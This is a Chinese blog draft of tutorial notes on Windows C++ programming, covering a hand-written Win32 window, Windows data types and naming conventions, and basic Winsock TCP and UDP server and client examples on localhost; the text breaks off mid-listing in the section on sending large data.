---
title: Windows快速入门
date: 2024-06-05 10:50:10
urlname: windows-Quick-Start
tags:
  - 操作系统与框架
  - Windows
  - CPP
categories: C++开发
description: Windows快速入门
draft: true
---


# 〇 目录

1. 学习windows编程
2. Windows编程基础知识
3. 网络编程
4. 网络编程进阶
5. 网络编程实战
6. 多线程
7. 进程
8. 文件操作


# 一 学习windows编程

## 1 windows编程是什么

- Windows程序设计：以C++类的形式封装了Windows API，并且包含一个应用程序框架，以减少应用程序开发人员的工作量。
  - 包含大量Windows句柄封装类和很多Windows的内建控件和组件的封装类。专心的考虑程序的逻辑，而不是这些每次编程都要重复的东西
  - 但是由于是通用框架，没有最好的针对性
- C/C++编程：仅产生少量的机器语言以及不需要任何运行环境支持便能运行的高效率程序设计语言。依靠非常全面的运算符和多样的数据类型，可以轻易完成各种数据结构的构建，通过指针类型更可对内存直接寻址以及对硬件进行直接操作，因此既能够用于开发系统程序，也可用于开发应用软件。

 <br>

## 2 为什么要学习windows编程

- 满足windows应用开发需求
- 满足外包开发需求：上位机 和 嵌入式设备结合
- 就业需要：今日头条 深信服 传统行业 360 安全行业
- 逆向/反外挂基础【汇编】

 <br>

## 3 怎么学习windows编程

- 掌握理论【1 C++面向对象思想和多态性，2 Windows消息循环】`msg` `loop` 窗口 网络  系统：进程和线程
- 学会查询文档
- 收藏这个网址：[https://docs.microsoft.com/zh-cn/*](https://docs.microsoft.com/zh-cn/) 【微软】【英文文档】
- 参考教材：孙鑫的《深入理解VC++》 参考
-  参考教材2：范文庆《Windows API 开发详解 函数、接口、编程实例》

 

 



<br>

## 4 环境安装和快捷键

### 4.1 环境安装

工作负载环境的安装：【工具：获取工具和功能 -> 使用C++的桌面开发】

 ![](W-1-1.png)



### 4.2 VA安装及常用快捷键

> VS2022已经不需要VA
>

常用快捷键 

–     ALT+G 调到定义

–     ALT + SHIFT + F 查找所有引用

–     ALT + 左箭头/右箭头 ：回退/前进

–     批量注释



<br>

# 二 Windows编程基础知识

## 2.1 完全手写第一个Win32窗口程序

> 创建新项目：windows桌面应用程序【此处使用空项目】

需要补充的点：

- windows中的“实例”，是诸如窗口、鼠标、键盘等等，”句柄“可以理解为是实例的标记。
- [WinMain](https://learn.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-winmain)/wWinMain，是Windows的入口函数

```c++
#include <windows.h>
#include <stdio.h>

//目的：win32窗口程序
//1 掌握C++ 面向对象思想 2 理解消息机制 3 多态性


//更改项目属性->高级->字符集->多字节字符集
LPCTSTR clsName = "My";//LP:指针 C：const STR:string T:宽字节
LPCTSTR msgName = "欢迎学习";//【窗口名，创建时用】
//若不更改字符集，则需要显式说明宽字节
//LPCTSTR msgName = L"欢迎学习";//L表明是后面是一个宽字节字符串，否则报错


//回调函数的声明
LRESULT CALLBACK MyWinProc(
	HWND hwnd,    // handle to window 窗口
	UINT uMsg,    // message identifier 消息类型
	WPARAM wParam,  // first message parameter word word16位参数
	LPARAM lParam  // second message parameter long
);

// 实现步骤:
// a 设计一个窗口类 b 注册窗口类 c创建窗口 d显示以及更新窗口 e 消息循环

// WINAPI = __stdcall 
// 相对于dos的main
int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{
	//a 设计一个窗口类**************************
	// 1 定义和配置窗口对象
	WNDCLASS wndcls;
	/*typedef struct tagWNDCLASSW
	{
		UINT        style;		//【使用默认值】
		WNDPROC     lpfnWndProc;//指向窗口过程的指针。 必须使用 CallWindowProc 函数调用窗口过程
		int         cbClsExtra; //要根据窗口类结构分配的额外字节数,系统将字节初始化为零
		int         cbWndExtra; //在窗口实例之后分配的额外字节数,系统将字节初始化为零
		HINSTANCE   hInstance;  //实例的句柄，该实例包含类的窗口过程
		HICON       hIcon;		//类图标的句柄。 此成员必须是图标资源的句柄。 如果此成员为 NULL，则系统会提供默认图标。
		HCURSOR     hCursor;	//类游标的句柄。此成员必须是游标资源的句柄。如果此成员为 NULL，则每当鼠标移动到应用程序的窗口中时，应用程序都必须显式设置光标形状
		HBRUSH      hbrBackground;//类背景画笔的句柄。 此成员可以是用于绘制背景的物理画笔的句柄，也可以是颜色值
		LPCWSTR     lpszMenuName; //类菜单的资源名称，该名称显示在资源文件中
		LPCWSTR     lpszClassName;//指向以 null 结尾的字符串的指针或 是原子
	} WNDCLASSW*/
	wndcls.cbClsExtra = NULL;
	wndcls.cbWndExtra = NULL;
	wndcls.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wndcls.hCursor = LoadCursor(NULL, IDC_ARROW);//第二参数为光标类型
	wndcls.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wndcls.hInstance = hInstance;

	//定义交互响应：回调函数
	wndcls.lpfnWndProc = MyWinProc;

	//定义窗口代号
	wndcls.lpszClassName = clsName;
	wndcls.lpszMenuName = NULL;

	wndcls.style = CS_HREDRAW | CS_VREDRAW;//具体函数见文档

	// b 注册窗口类**************************
	RegisterClass(&wndcls);

	//c 创建窗口 ***************************
	HWND hwnd;
	//CreateWindowA(lpClassName, lpWindowName, dwStyle, x, y,nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam)
	hwnd = CreateWindow(clsName, msgName, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);

	//d 显示和刷新窗口**************************
	ShowWindow(hwnd, SW_SHOWNORMAL);
	UpdateWindow(hwnd);

	//e 消息循环 0**************************
	MSG msg;
	//GetMessage只有在接收到WM_QUIT才会返回0
	while (GetMessage(&msg, NULL, NULL, NULL))
	{
		//将消息放入消息队列
		//TranslateMessage翻译消息,如将按键消息转化为字符消息
		//TranslateMessage(&msg);
		//DispatchMessage(&msg);
	}
	return msg.wParam;//指针类型
}





// 回调函数定义
LRESULT CALLBACK MyWinProc(
	HWND hwnd,    // handle to window 窗口句柄
	UINT uMsg,    // message identifier 消息类型【重要:鼠标、字符、按键消息...】
	WPARAM wParam,  // first message parameter word word16位参数
	LPARAM lParam  // second message parameter long
)
{
	int ret;
	HDC hdc;
	switch (uMsg)
	{
	case WM_CHAR://字符消息【WM:windows message】
		char szChar[20];
		sprintf_s(szChar, "您刚按下了:%c", wParam);//安全拷贝函数
		MessageBox(hwnd, szChar, "char", NULL);//在窗口打印
		break;
	case WM_LBUTTONDOWN://左键按下
		MessageBox(hwnd, "检测到鼠标左键按下", "L-msg", NULL);//在窗口打印
		break;
	case WM_PAINT://重绘消息【如最大化最小化】
		PAINTSTRUCT ps;
		hdc = BeginPaint(hwnd, &ps);
		TextOut(hdc, 0, 0, "重绘窗口！", strlen("重绘窗口！"));//开始画
		EndPaint(hwnd, &ps);
		MessageBox(hwnd, "检测到重绘", "msg-重绘", NULL);//在窗口打印
		break;
	case WM_CLOSE://关闭消息
		ret = MessageBox(hwnd, "是否直接结束？", "msg", MB_YESNO);
		if (ret== IDYES)
		{
			DestroyWindow(hwnd);
		}
		break;
	case WM_DESTROY://毁灭消息
		//发送WM_QUIT使退出while循环
		PostQuitMessage(0);
		break;
	default:
		//break;
		//其他消息返回默认消息
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
	return 0;
}
```

> 该程序运行出现功能缺失的问题，但无需过于关心。目前开发使用Qt、MFC。

 📋程序骨架

```c++
 int WinMain(){
   // 设计窗口外观及交互响应，注册，申请专利
   RegisterClass(...)
   // 生产窗口
   CreateWindow(...)
   // 展示窗口
   ShowWindow(...)
   // 粉刷窗口
   UpdateWindow(...)
   // 进入消息循环
   while (GetMessage(...)) {
     // 消息转换
     TranslateMessage(...);
     // 消息分发
     DispatchMessage(...);
   }
 }
```



<br>

### 2.1.1 链接错误

🔺出现链接错误：

```c++
//错误:	LNK2019	无法解析的外部符号 _main
//函数 "int __cdecl invoke_main(void)" (?invoke_main@@YAHXZ) 中引用了该符号	windows_start
```

解决：修改配置属性【链接器 | 所有选项 | 子系统：窗口】



### 2.1.2 `LNK1104`: 无法打开文件`*.exe`

- 解决方案一：打开任务管理器，关掉项目中的`.exe`文件，再重新生成解决方案；
- 解决方案二：修改你的项目文件夹的属性为非只读文件，打开项目文件夹【右击-属性-只读前面的方框取消】，再重新生成解决方案；
- 解决方案三：如果修改了代码后才出现了这样的问题，可能代码修改没有应用到程序内。解决：点击`vs`中的生成-配置管理器，勾选生成下面的√【win32改成x64】。



<br>

## 2.2 API与SDK

`Application Programming Interface` 应用程序编程接口。

 `Software Development Kit` 软件开发工具包，一般会包括API接口文档、示例文档、帮助文档、使用手册、相关工具等。



## 2.3 窗口与句柄/窗口类对象

窗口就是屏幕上的一片区域，接收用户的输入，显示程序的输出。可以包含标题栏，菜单栏，工具栏，控件等。

![img](W-2-1.png)

句柄`handle` 【资源的编号 | 二级指针 | 门把手】：窗口句柄，文件句柄，数据库连接句柄。

> 值得注意的是：C++窗口类对象与窗口并不是一回事。
>
> 它们之间惟一的关系是C++窗口类对象内部定义了一个窗口句柄变量，保存了与这个C++窗口类对象相关的那个窗口的句柄。窗口销毁时，与之对应的C++窗口类对象销毁与否，要看其生命周期是否结束。但C++窗口类对象销毁时，与之相关的窗口也将销毁。

1. 生命周期  > 窗口类对象周期  `>` 窗口
2. 窗口类内部定义了窗口句柄`m_wnd`



## 2.4 消息循环

-  银行场景
   ![bank](W-2-2.png)

- windows消息循环

 ![DispatchMessage](W-2-3.jpg)



## 2.5 Windows数据类型和命名规范

🔺`Unicode`是世界通用的字符编码标准，使用16位数据表示一个字符，一共可以表示65535种字符。

🔺`ASNI`字符集，使用8位数据或将相邻的两个8位的数据组合在一起表示特殊的语言字符。如果一个字节是负数，则将其后续的一个字节组合在一起表示一个字符。这种编码方式的字符集也称作**多字节字符集**。

| 数据类型  | 含义                                                         | 本质                   |
| --------- | ------------------------------------------------------------ | ---------------------- |
| DWORD     | 32位无符号整型数据                                           | unsigned long          |
| DWORD32   | 32位无符号整型数据                                           | unsigned int           |
| DWORD64   | 64位无符号整型数据                                           | unsigned __int64       |
| HANDLE    | 对象的句柄，最基本的句柄类型                                 | void*                  |
| HICON     | 图标的句柄                                                   | void*                  |
| HINSTANCE | 程序实例的句柄，32位无符号的长整形                           | unsigned long          |
| HKEY      | 注册表键的句柄                                               | void*                  |
| HMODULE   | 模块的句柄                                                   | HINSTANCE              |
| HWND      | 窗口的句柄                                                   | void*                  |
| INT       | 32位符号整型数据类型                                         | int                    |
| INT_PTR   | 指向INT类型数据的指针类型                                    | int                    |
| INT32     | 32位符号整型                                                 | signed int             |
| INT64     | 64位符号整型                                                 | signed __int64         |
| LONG32    | 32位符号整型                                                 | signed int             |
| LONG64    | 64位符号整型                                                 | __int64                |
| LPARAM    | 消息的L参数                                                  | LONG_PTR: long         |
| WPARAM    | 消息的W参数                                                  | UINT_PTR: unsigned int |
| LPCSTR    | Windows，ANSI，字符串常量【指针P const string】              | char                   |
| LPCTSTR   | 根据环境配置，如果定义了UNICODE宏，则是LPCWSTR类型，否则是LPCSTR类型 | wchar_t/char           |
| LPCWSTR   | UNICODE字符串常量【const wchar string】                      | wchar_t                |
| LPDWORD   | 指向DWORD类型数据的指针                                      | unsigned long          |
| LPSTR     | Window，ANSI，字符串变量【无W】                              | char                   |
| LPTSTR    | 根据环境配置，如果定义了UNICODE，则是LPWSTR类型，否则是LPSTR类型 | wchar_t/char           |
| LPWSTR    | UNICODE字符串变量【W】                                       | wchar_t                |
| SIZE_T    | 表示内存大小，以字节为单位，其最大值是CPU最大寻址范围        | unsigned long          |
| TCHAR     | 如果定义了UNICODE，则为WCHAR，否则为CHAR                     | wchar_t/char           |
| WCHAR     | 16位Unicode字符                                              | wchar_t                |

**命名规范：**

| 前缀  | 含义                  | 前缀 | 含义                      |
| ----- | --------------------- | ---- | ------------------------- |
| a     | 数组 array            | b    | 布尔值 bool               |
| by    | 无符号字符(字节)      | c    | 字符(字节)                |
| cb    | 字节计数              | rgb  | 保存颜色值的长整型        |
| cx,cy | 短整型(计算x,y的长度) | dw   | 无符号长整型              |
| fn    | 函数                  | h    | 句柄                      |
| i     | 整形(integer)         | m_   | 类的数据成员member        |
| n     | 短整型或整型          | np   | 近指针                    |
| p     | 指针(pointer)         | l    | 长整型(long)              |
| lp    | 长指针                | s    | 字符串string              |
| sz    | 以零结尾的字符串      | tm   | 正文大小                  |
| w     | 无符号整型            | x,y  | 无符号整型(表示x,y的坐标) |

 



 <br>

# 三 网络编程

## 3.1 网络编程基本概念

### 3.1.1 socket概念

套接字在英文里面就是“插孔/插座”的意思，套接字是网络数据传输用的软件设备。

创建一个套接字就相当于是安装了一部电话机。



### 3.1.2 什么是C/S模式

客户机/服务器模式在操作过程中采取主动请求的方式。

- 服务器端：
  1.    首先服务器先启动，并根据请求提供相应的服务：
  2. 打开一个通信通道，在某一地址和端口上接收请求。
  3. 等待客户请求到达该端口。
  4. 接收到重复服务请求，处理该请求并发送应答信号。
  5. 返回第二步，等待另一客户请求。
  6. 关闭服务器。

- 客户端：
  1. 打开一个通信通道，并连接到服务器所在主机的特定端口。
  2. 向服务器发服务请求，等待并接收应答；继续提出请求。
  3. 请求结束后关闭通信通道并终止。

 

### 3.1.3 什么是面向连接和面向消息【TCP/UDP】

面向连接的套接字TCP：

- 传输过程中数据不会丢失
- 按顺序传输数据
- 传输的过程中不存在数据边界【100个糖果分批传递，但接受者需要凑齐100个装袋】

面向消息的套接字UDP：

- 强调快速传输而非顺序
- 传输的数据可能丢失也可能损毁
- 限制每次传输数据的大小
- 传输的数据有数据边界



### 3.1.4 IP地址和端口

IP地址：是分配给用户上网使用的网际协议

- 常见的的IP地址分为IPv4与iPV6两大类，但是也有其他不常用的小分类
- IP地址就好像街道地址【地址码】：有了某人的街道地址，你就能找到他并与他通信了。同样，有了某台主机的IP地址，你就能与这台主机通信了。

Port端口：为区分程序中创建的套接字而分配给套接字的序号。

- 如果把IP地址比作房子，端口就是出入房子的门。
- 真正的房子只有几个门，但端口可以有65536（即：2^16）个之多！
  - 0-1023一般被用作知名服务器的端口，被预定，如FTP、HTTP、SMTP
  - WWW选择80，而FTP则以21为正常的联机信道 

 

<br>

## 3.2 套接字类型与协议设置

- `SOCK_STREAM`【流套接字】TCP：面向连接、可靠的数据传输 ，适合传输大量的数据，不支持广播、多播
- `SOCK_DGRAM`【数据包套接字】  UDP：无连接  支持广播、多播【报文】
- `SOCK_RAW`【原始套接字】：可以读写内核没有处理的IP数据报，避开TCP/IP处理机制，被传送的数据报可以被直接传送给需要它的的应用程序

头文件与库：

- 引用头文件`winsock2.h` 
- 导入`ws2_32.lib`库
- window下socket编程都要首先进行Winsock的初始化 



<br>


## 3.3 网络编程基本函数和基本数据结构

| 函数名称 | 功能描述                         | 适用范围                        |
| -------- | -------------------------------- | ------------------------------- |
| socket   | 创建套接字                       | 面向连接的传输+面向无连接的传输 |
| bind     | 套接字与本地IP地址和端口号的绑定 | 面向连接的传输+面向无连接的传输 |
| connect  | 请求连接                         | 面向连接的传输的客户机进程      |
| listen   | 侦听连接请求                     | 面向连接的传输的服务器进程      |
| accept   | 接收连接请求                     | 面向连接的传输的服务器进程      |
| send     | 往已建立连接的套接字上发送数据   | 面向连接的传输                  |
| recv     | 从已建立连接的套接字上接收数据   | 面向连接的传输                  |
| sendto   | 在无连接的套接字上发送数据       | 主要用于无连接的传输            |
| recvfrom | 在无连接的套接字上接收数据       | 主要用于无连接的传输            |
| close    | 关闭套接字                       | 面向连接的传输+面向无连接的传输 |



数据结构：

```c++
struct sockaddr {			//操作系统使用
  u_short  sa_family;      //16位地址类型 2字节
  char    sa_data[14];      //14字节地址数据：ip + port
};  

struct sockaddr_in {		//程序员使用
  short  sin_family;         //16位地址类型
  u_short sin_port;            //16位端口号 65535 2的16次方
  struct in_addr sin_addr;  //32位IP地址 4字节
  char  sin_zero[8];        //8字节填充
};
```



<br>

## 3.4 基于TCP的服务端/客户端

>  VS技巧：在同一个解决方案中创建多个项目【解决方案右击菜单 -> 添加 】，可右击项目设置为启动项
>
>  注意：上面的方法创建的项目，生成解决方案后，会在总解决方案的Debug文件夹中生成可执行的exe文件



### 3.4.1 TCP套接字

![tcp_socket](W-3-1.png)

📋服务端

```c++
#include <stdio.h>//printf
#include <stdlib.h>//system
#include <WinSock2.h>

#pragma comment(lib,"ws2_32.lib")

int main()
{
	printf("TCP Server\n");
	//0 初始化网络库
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(1, 1);
	// 初始化套接字库
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		return err;
	}

	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return -1;
	}


	//1 安装电话机 【可选择函数，按F1转到联网资源】
	SOCKET  sockServ = socket(AF_INET, SOCK_STREAM, 0);//tcp ipv4
	if (INVALID_SOCKET == sockServ)
	{
		printf("Server socket errno: %d\n", GetLastError());
		return -1;
		//errno：10093【应用程序没有调用 WSAStartup，或者 WSAStartup 失败。 】
	}
	//2 分配电话号码，填充参数
	SOCKADDR_IN addrServ, addrClient;
	int szAddrCnt = sizeof(addrClient);

	addrServ.sin_family = PF_INET;
	addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServ.sin_port = htons(6000);

	if (SOCKET_ERROR == bind(sockServ, (sockaddr*)&addrServ, sizeof(addrServ)))
	{
		printf("bind ERRORNO = %d\n", GetLastError());
		return -1;
	}

	//3 监听
	;
	if (SOCKET_ERROR == listen(sockServ, 5))
	{
		printf("listen ERRORNO = %d\n", GetLastError());
		return -1;
	}

	//4 accpet 分配一台分机处理客户端连接
	while (true)
	{
		printf("Wait ACCEPT:\n");
		SOCKET sockCnt = accept(sockServ, (sockaddr*)&addrClient, &szAddrCnt);
		char sendBuf[100] = { 0 };
		//sprintf_s(sendBuf, 100, "Welcome %s to Server!", inet_ntoa(addrClient.sin_addr));//字符串拷贝函数
		sprintf_s(sendBuf, 100, "Welcome %s to Server!");
		//5 收发数据
		int iLen = send(sockCnt, sendBuf, strlen(sendBuf), 0);//flag=0 表示阻塞
		char recvBuf[100] = { 0 };
		iLen = recv(sockCnt, recvBuf, 100, 0);
		printf("recvBuf= %s\n", recvBuf);

		//6 关闭分机
		closesocket(sockCnt);
	}
	//7 关闭总机
	closesocket(sockServ);


	system("pause");
	return 0;
}
```

注意：

- 报错`LINK2019`：即bind/accept等函数的外部库未导入【解决：`#pragma comment(lib,"ws2_32.lib")`】
- 第一步必须初始化网络库
- `GetLastErro()`函数取得错误后，可使用【工具 | 查找错误】
- 未初始化网络库时，报错`10093`【应用程序没有调用 `WSAStartup`，或者 `WSAStartup` 失败】【36行】



📋客户端【在统一解决方案下添加空项目】

```c++
#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>

#pragma comment(lib,"ws2_32.lib")

int main()
{
	printf("TCP Client\n");
	//0 初始化网络库
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(1, 1);
	// 初始化套接字库
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		return err;
	}

	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return -1;
	}

	//1 安装电话机 【可选择函数，按F1转到联网资源】
	SOCKET  sockClient = socket(AF_INET, SOCK_STREAM, 0);//tcp ipv4
	if (INVALID_SOCKET == sockClient)
	{
		printf("Server socket errno: %d\n", GetLastError());
		return -1;
		//errno：10093【应用程序没有调用 WSAStartup，或者 WSAStartup 失败。 】
	}

	//2 connect 配置要连接的服务器
	SOCKADDR_IN addrServ;
	int szAddrCnt = sizeof(addrServ);

	addrServ.sin_family = AF_INET;
	addrServ.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	addrServ.sin_port = htons(6000);

	//3 连接服务器
	if (SOCKET_ERROR == connect(sockClient, (sockaddr*)&addrServ, sizeof(addrServ)))
	{
		printf("connect ERRORNO = %d\n", GetLastError());
		return -1;
	}

	//4 收发数据
	char recvBuf[100] = { 0 };
	int iLen = recv(sockClient, recvBuf, 100, 0);
	printf("recvBuf: %s\n", recvBuf);
	
	char sendBuf[100] ="hhhhhh";
	iLen = send(sockClient, sendBuf, strlen(sendBuf), 0);

	//5 关闭套接字
	closesocket(sockClient);
	//6 终止套接字
	WSACleanup();
	//如果操作成功，则返回值为零。 否则，将返回值SOCKET_ERROR，并且可以通过调用 WSAGetLastError 检索特定的错误号。
	//	在多线程环境中， WSACleanup 终止所有线程的 Windows 套接字操作。

	system("pause");
	return 0;
}
```

**注意：**

- 从文件管理器打开服务器，设置客户端为启动项来调试客户端

🔺关于`inet_addr`的报错

```c++
错误	C4996	'inet_addr': 
Use inet_pton() or InetPton() instead or define _WINSOCK_DEPRECATED_NO_WARNINGS to disable deprecated API warnings
```

**解决办法：**【属性 | C++ | 预处理器：预处理器定义】在第一栏中添加`_WINSOCK_DEPRECATED_NO_WARNINGS`



<br>

### 3.4.2 UDP套接字

![udp_socket](W-3-2.png) 

📋服务端

```c++
#include <stdio.h>//printf
#include <iostream>
#include <WinSock2.h>

#include <time.h>

#pragma comment(lib,"ws2_32.lib")

int getCurrentTimeStr(char* strtime);
void ErrorHandling(const char* message, int ERRNO);


int main()
{
	printf("UDP Server\n");
	//0 初始化网络库
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0)//2 2 表示WinSock2.h的二版本
	{
		ErrorHandling("WSAStartup() error!", WSAGetLastError());
	}

	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)//2表示WinSock2.h的二版本
	{
		WSACleanup();
		return -1;
	}

	char ch[64] = { 0 };//存储时间

	//1 创建socket
	SOCKET  sockServ = socket(AF_INET, SOCK_DGRAM, 0);//udp ipv4
	if (sockServ == INVALID_SOCKET)
	{
		ErrorHandling("Server socket Error!", WSAGetLastError());
		return -1;//errno：10093【应用程序没有调用 WSAStartup，或者 WSAStartup 失败】
	}

	//2 bind 分配地址和端口
	SOCKADDR_IN addrServ, addrClient;
	memset(&addrServ, 0, sizeof(addrServ));
	memset(&addrClient, 0, sizeof(addrClient));
	int szAddrCnt = sizeof(addrClient);

	addrServ.sin_family = AF_INET;
	addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServ.sin_port = htons(44444);
	int ret = bind(sockServ, (sockaddr*)&addrServ, sizeof(addrServ));
	if (SOCKET_ERROR == ret)
	{
		//printf("Bind ERROR:%d\n",WSAGetLastError());
		ErrorHandling("Bind ERROR", WSAGetLastError());
		return -1;
	}

	//3 等待收发数据【阻塞】[直接接到服务端socket]
	char recvBuf[100] = { 0 };
	char sendBuf[100] = { 0 };

	while (true)
	{
		printf("Wait Message:\n");
		recvfrom(sockServ, recvBuf, sizeof(recvBuf), 0, (sockaddr*)&addrClient, &szAddrCnt);
		std::cout << recvBuf << std::endl;

		sprintf_s(sendBuf, sizeof(sendBuf), "Ack: %s\n", recvBuf);
		sendto(sockServ, sendBuf, strlen(sendBuf) + 1, 0, (sockaddr*)&addrClient, szAddrCnt);
	}
	//7 关闭总机
	closesocket(sockServ);

	system("pause");
	return 0;
}


#pragma warning(disable:4996)
int getCurrentTimeStr(char* strtime)
{
	// 基于当前系统的当前日期/时间
	time_t now = time(NULL);
	tm* ltm = localtime(&now);
	sprintf(strtime, "%2d:%2d:%2d", ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
	return 0;
}
void ErrorHandling(const char* message, int ERRNO)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	char ch[64];
	getCurrentTimeStr(ch);
	//printf("Error num = %d, Error time %s\n", ::GetLastError(), ch);
	printf("Error num = %d, Error time %s\n", ERRNO, ch);
	system("pause");
	exit(-1);
}
```

> UDP服务端一直`bind`错误：【错误原因】UDP端口被占用【具体调试方法见第九章】

📋 客户端

```c++
#include <stdio.h>
#include <iostream>
#include <WinSock2.h>

#include <time.h>//getCurrentTimeStr

#pragma comment(lib,"ws2_32.lib")

int UDPClient();

void ErrorHandling(const char* message);
int getCurrentTimeStr(char* strtime);

int main()
{

	UDPClient();
	system("pause");
	return 0;
}

int UDPClient()
{
	printf("UDP Client\n");
	//0 初始化网络库
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)//2 2 表示WinSock2.h的二版本
	{
		ErrorHandling("WSAStartup() error!");
	}

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)//2表示WinSock2.h的二版本
	{
		WSACleanup();
		return -1;
	}

	char ch[64] = { 0 };//存储时间

	//1 初始化套接字
	SOCKET  sock_cli = socket(AF_INET, SOCK_DGRAM, 0);//UDP ipv4
	if (sock_cli == INVALID_SOCKET)
	{
		ErrorHandling("Server socket errno: %d\n");
	}
	getCurrentTimeStr(ch);//将当前时间存入ch
	printf("begin connect %s\n", ch);

	//2 准备发送地址和端口
	SOCKADDR_IN addrServ;
	int szAddrServ = sizeof(addrServ);
	memset(&addrServ, 0, sizeof(addrServ));

	addrServ.sin_family = AF_INET;
	addrServ.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	addrServ.sin_port = htons(44444);

	//3 直接收发数据
	char recvBuf[100] = { 0 };
	char sendBuf[100] = "Hello!";

	int strLen = sendto(sock_cli, sendBuf, strlen(sendBuf) + 1, 0, (sockaddr*)&addrServ, szAddrServ);
	printf("After send %d\n", strLen);

	int ret = recvfrom(sock_cli, recvBuf, sizeof(recvBuf), 0, (sockaddr*)&addrServ, &szAddrServ);
	printf("Message from server: ,ret = %d\n", ret);
	std::cout << "recvBuf" << recvBuf << std::endl;

	if (strLen == -1)
		ErrorHandling("read() error!");

	getCurrentTimeStr(ch);
	printf("after recv %s\n", ch);

	//5 关闭套接字
	closesocket(sock_cli);
	//6 终止套接字
	WSACleanup();

	system("pause");
	return 0;
}


#pragma warning(disable:4996)
int getCurrentTimeStr(char* strtime)
{
	// 基于当前系统的当前日期/时间
	time_t now = time(NULL);
	tm* ltm = localtime(&now);
	sprintf(strtime, "%2d:%2d:%2d", ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
	return 0;
}

void ErrorHandling(const char* message)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	char ch[64];
	getCurrentTimeStr(ch);
	printf("error num = %d, error time %s\n", ::GetLastError(), ch);
	system("pause");
	exit(-1);
}
```



<br>

### 3.4.3 关于TCP和UDP的总结

|              | **UDP**                                    | **TCP**                                |
| ------------ | ------------------------------------------ | -------------------------------------- |
| 是否连接     | 无连接                                     | 面向连接                               |
| 是否可靠     | 不可靠传输，不使用流量控制和拥塞控制       | 可靠传输，使用流量控制和拥塞控制       |
| 连接对象个数 | 支持一对一，一对多，多对一和多对多交互通信 | 只能是一对一通信                       |
| 传输方式     | 面向报文                                   | 面向字节流                             |
| 适用场景     | 适用于实时应用（IP电话、视频会议、直播等） | 适用于要求可靠传输的应用，例如文件传输 |

 

<br>

# 四 网络编程进阶

## 4.1 listen的具体含义

监听`listen(sock_serv, 5)`表示同时监听的最大客户数为5，即执行到`listen`，但尚未执行到`accept`的队列【并非可服务的客户端数量，而是同时可建立连接的客户端数量，也就是说，该数值是考虑到操作系统的承受能力】。

```c++
//在上面的服务端代码中添加：在listen之后休眠20s
Sleep(20000);
//队列满了之后，后面的连接请求无法accept
```



<br>

## 4.2 一种更优雅的recv和send：超大数据的传输

📋基于`3.4.1`修改后的服务器：

- 新增`MySocketRecv0` 和 `MySocketSend0` 用于循环接受和发送
- 新增 `ErrorHandling` 统一处理错误提示
- 新增 `getCurrentTimeStr` 打印时间
- 简化了初始化网络库的代码

```c++
#include <stdio.h>//printf
#include <stdlib.h>//system
#include <WinSock2.h>

#include <time.h>

#pragma comment(lib,"ws2_32.lib")

#define MAX_ARRAYSIZE (1024*1024*10)
char message[MAX_ARRAYSIZE];

int MySocketRecv0(int sock, char* buf, int dateSize);
int MySocketSend0(int socketNum, unsigned char* data, unsigned dataSize);

int getCurrentTimeStr(char* strtime);
void ErrorHandling(const char* message);


int main()
{
	printf("TCP Server\n");
	//0 初始化网络库
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0)
	{
		ErrorHandling("WSAStartup() error!");
	}

	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return -1;
	}

	char ch[64] = { 0 };//存储时间

	//1 创建socket
	SOCKET  sockServ = socket(AF_INET, SOCK_STREAM, 0);//tcp ipv4
	if (INVALID_SOCKET == sockServ)
	{
		ErrorHandling("Server socket errno: %d\n");
		return -1;
		//errno：10093【应用程序没有调用 WSAStartup，或者 WSAStartup 失败。 】
	}
	//2 bind参数
	SOCKADDR_IN addrServ, addrClient;
	int szAddrCnt = sizeof(addrClient);

	addrServ.sin_family = PF_INET;
	addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServ.sin_port = htons(6000);

	if (SOCKET_ERROR == bind(sockServ, (sockaddr*)&addrServ, sizeof(addrServ)))
	{
		ErrorHandling("bind ERRORNO = %d\n");
		return -1;
	}

	//3 监听
	if (SOCKET_ERROR == listen(sockServ, 5))
	{
		ErrorHandling("listen ERRORNO = %d\n");
		return -1;
	}

	//4 accpet 分配一台分机处理客户端连接【回声服务器】
	while (true)
	{
		printf("Wait ACCEPT:\n");
		SOCKET sockCnt = accept(sockServ, (sockaddr*)&addrClient, &szAddrCnt);

		//5 收发数据
		int ret = MySocketRecv0(sockCnt, message, sizeof(message) - 1);
		printf("Message from client: ,ret = %d\n", ret);
		//回声
